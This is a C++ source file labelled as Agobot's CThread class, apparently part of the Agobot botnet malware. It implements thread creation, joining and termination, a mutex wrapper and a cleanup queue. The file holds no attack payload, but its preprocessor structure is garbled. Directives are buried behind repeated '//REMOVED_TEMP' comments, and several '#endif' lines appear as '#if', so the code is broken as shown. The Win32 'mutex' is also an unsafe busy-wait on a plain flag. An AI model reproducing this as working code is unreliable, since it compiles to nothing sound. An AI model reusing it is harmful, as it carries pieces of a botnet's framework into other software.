//Agobot CThread class

#include "Include.h"
#include "cthread.h"

// Volatile pthreads refcount
int volatile g_iRefCount=0;

//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifndef WIN32
// Global that is set if PThreads is initialized
bool g_bPThreadsInited=false;
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if // WIN32

// Number of threads currently running
int volatile g_iNumThreads=0;

CThread::CThread() {
	// Set the dynamic state to false
	m_bDynamic=true;
	m_bRunning=false;
	m_bRestart=false;
	m_szType="CThread";
	CThread::InitPThreads();
}

CThread::~CThread() {
	try {
		// Kill the thread in case its still running
		if(m_bRunning)
		{
			m_bRunning=false;
			m_mRunning.Unlock();

//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef WIN32
			TerminateThread(m_hThread, 1);
#else
			// Join the thread
			pthread_join(m_tThread, NULL);
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if // WIN32
		}
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef PtW32CatchAll
	} PtW32CatchAll {
#else
	} catch(...) {
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef DBGCONSOLE
		if(g_pMainCtrl) g_pMainCtrl->m_cConsDbg.Log(2, "CThread::~CThread(cthread.cpp): Kill() caused an exception.\n");
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if // DBGCONSOLE
	}
	CThread::CleanupPThreads();
}

void CThread::InitPThreads() {
	if(!g_iRefCount) {
//		pthread_win32_process_attach_np();
//		pthread_win32_thread_attach_np();
//		g_bPThreadsInited=true;
		g_iRefCount++;
	}
	else
		g_iRefCount++;
}

void CThread::CleanupPThreads() {
	if(g_iRefCount>1)
		g_iRefCount--;
	else {
		g_iRefCount--;
//		pthread_win32_process_detach_np();
//		pthread_win32_thread_detach_np();
	}
}

bool CThread::Start(bool bDynamic, bool bRestart, bool bRealtime) {
	m_bDynamic=bDynamic; m_bRestart=bRestart;
	try {
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef WIN32
		m_hThread=CreateThread(NULL, 0, (unsigned long (__stdcall *)(void *))&this->RunWrapper, this, 0, &m_dwThreadId);
		if(m_hThread)
		{	m_mRunning.Lock(); m_bRunning=true; return true; }
		else
		{	m_mRunning.Unlock(); m_bRunning=false; return false; }
#else
		if(!pthread_create(&m_tThread, NULL, &this->RunWrapper, this))
		{	m_mRunning.Lock(); m_bRunning=true; return true; }
		else
		{	m_mRunning.Unlock(); m_bRunning=false; return false; }
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if // WIN32

//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef PtW32CatchAll
	} PtW32CatchAll {
#else
	} catch(...) {
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef DBGCONSOLE
		if(g_pMainCtrl) g_pMainCtrl->m_cConsDbg.Log(2, "CThread::Start(cthread.cpp): pthread_create caused an exception.\n");
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if // DBGCONSOLE
		m_mRunning.Unlock(); m_bRunning=false; return false;

	}
}

void CThread::Kill() {
	Join();
}

int CThread::Join() {
	try {
		// Join the thread
		if(m_bRunning) {	
			m_bRunning=false; m_bRestart=false;
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef WIN32
			return TerminateThread(m_hThread, 1);
#else
			return pthread_join(m_tThread, NULL);
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if // WIN32
		} else return 0;
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef PtW32CatchAll
	} PtW32CatchAll {
#else
	} catch(...) {
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef DBGCONSOLE
		if(g_pMainCtrl) g_pMainCtrl->m_cConsDbg.Log(2, "CThread::Join(cthread.cpp): Exception thrown (%s).\n", m_szType);
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if // DBGCONSOLE
	}

	return 0; }

void *CThread::RunWrapper(void *pArgs) {
	CThread *pThread=(CThread*)pArgs;

	while(true)
	{
		try {
			g_iNumThreads++;

			// Call the pure virtual of the thread function
			pThread->Run();

			g_iNumThreads--;

//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef PtW32CatchAll
		} PtW32CatchAll {
#else
		} catch(...) {
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if
			g_iNumThreads--;
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef DBGCONSOLE
			if(g_pMainCtrl) {
				if(pThread->m_bRestart)
					if(pThread->m_szType)
						g_pMainCtrl->m_cConsDbg.Log(2, "CThread::RunWrapper(cthread.cpp): %s thread caused an exception, restarting.\n", pThread->m_szType);
					else
						g_pMainCtrl->m_cConsDbg.Log(2, "CThread::RunWrapper(cthread.cpp): Unnamed thread caused an exception, restarting.\n");
				else
					g_pMainCtrl->m_cConsDbg.Log(2, "CThread::RunWrapper(cthread.cpp): Thread caused an exception, exiting.\n");
			}
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if // DBGCONSOLE
		}
		if(!pThread->m_bRestart) break;
	}

//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef DBGCONSOLE
	if(pThread->m_szType)
		if(g_pMainCtrl) g_pMainCtrl->m_cConsDbg.Log(2, "CThread::RunWrapper(cthread.cpp): %s thread exiting (%d threads).\n", pThread->m_szType, g_iNumThreads);
	else
		if(g_pMainCtrl) g_pMainCtrl->m_cConsDbg.Log(2, "CThread::RunWrapper(cthread.cpp): Unnamed thread exiting (%d threads).\n", g_iNumThreads);
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if // DBGCONSOLE

	pThread->m_bRunning=false;
	//if(pThread->m_bDynamic) g_pCleanupThread->Schedule(pThread);
	pThread->m_mRunning.Unlock();
	return NULL;
}

CMutex::CMutex() {
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef WIN32
	m_bLocked=false;
#else
	CThread::InitPThreads();
	// Initialize the mutex
	pthread_mutex_init(&m_mMutex, NULL);
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if // WIN32
}

CMutex::~CMutex() {
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef WIN32
	m_bLocked=false;
#else
	CThread::CleanupPThreads();
	// Destroy the mutex
	pthread_mutex_destroy(&m_mMutex);
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if // WIN32
}

void CMutex::Lock() {
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef WIN32
	while(m_bLocked) Sleep(500);
	m_bLocked=true;
#else
	// Lock the mutex
	pthread_mutex_lock(&m_mMutex);
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if // WIN32
}

void CMutex::Unlock() {
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef WIN32
	m_bLocked=false;
#else
	// Unlock the mutex
	pthread_mutex_unlock(&m_mMutex);
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if // WIN32
}

CCleanupThread::CCleanupThread()
{
	m_szType="CCleanupThread";
}

void *CCleanupThread::Run()
{	while((g_iRefCount || !m_lQueue.empty()) && m_bRunning)
	{	Cleanup(); Sleep(2000); }
	return NULL; }

void CCleanupThread::Schedule(CThread *pThread)
{	if(pThread==this) return;

	m_mLock.Lock();
	try {
		m_lQueue.push_back(pThread);
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef PtW32CatchAll
	} PtW32CatchAll {
#else
	} catch(...) {
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef DBGCONSOLE
		if(g_pMainCtrl) g_pMainCtrl->m_cConsDbg.Log(2, "CCleanupThread: Schedule() got invalid value 0x%.8X.\n", pThread);
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if // DBGCONSOLE
	}
	m_mLock.Unlock(); }

void CCleanupThread::Cleanup()
{	try {
		m_mLock.Lock(); list<CThread*>::reverse_iterator it;
		for(it=m_lQueue.rbegin(); it!=m_lQueue.rend(); ++it)
		{	
			CThread *pThread=(*it);
			try {
				bool bBla=pThread->m_bDynamic;
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef DBGCONSOLE
				if(g_pMainCtrl) g_pMainCtrl->m_cConsDbg.Log(2, "CCleanupThread: Cleaning up \"%s\".\n", pThread->m_szType);
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if // DBGCONSOLE

				if(pThread->m_bDynamic) delete pThread;
				else {
					pThread->Kill();
					pThread->Join();
				}
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef PtW32CatchAll
			} PtW32CatchAll {
#else
			} catch(...) {
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef DBGCONSOLE
				if(g_pMainCtrl) g_pMainCtrl->m_cConsDbg.Log(2, "CCleanupThread: m_lQueue contained invalid value.\n");
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if // DBGCONSOLE
			}
		}
		m_lQueue.clear(); m_mLock.Unlock();
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef PtW32CatchAll
	} PtW32CatchAll {
#else
	} catch(...) {
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef DBGCONSOLE
		if(g_pMainCtrl) g_pMainCtrl->m_cConsDbg.Log(2, "CCleanupThread: m_lQueue invalid.\n");
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if // DBGCONSOLE
	}
}
